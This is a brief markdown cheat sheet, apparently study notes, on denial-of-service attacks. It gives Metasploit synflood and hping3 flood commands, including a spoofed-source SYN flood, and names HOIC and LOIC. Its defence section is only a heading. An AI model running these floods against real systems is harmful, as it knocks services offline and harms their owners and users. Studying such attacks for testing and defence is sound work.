# Denial Of Service

## DoS and DDoS attacks using various Techniques

### DoS attack (SYN flooding) on a target host using Metasploit

```
msfconsole
use auxiliary/dos/tcp/synflood
```

### DoS attack on a target host using hping3

```
hping3 -S (Target IP Address) -a (Spoofable IP Address) -p port --flood
hping3 -d 65538 -S -p port --flood (Target IP Address)
```
hping3 floods the victim machine by sending bulk packets, and thereby overloading the victim’s resources.

* -d: specifies data size;
* -S: sets the SYN flag;
* -p: specifies the destination port;
* --flood: sends a huge number of packets.
* -a: Spoofable IP address

```
hping3 -2 -p port --flood
```

### DDoS attack using HOIC (Windows)
### DDoS attack using LOIC (Windows)

## Detect and protect against DoS and DDoS attacks

### Detect and protect against DDoS attacks using Anti DDoS Guardian

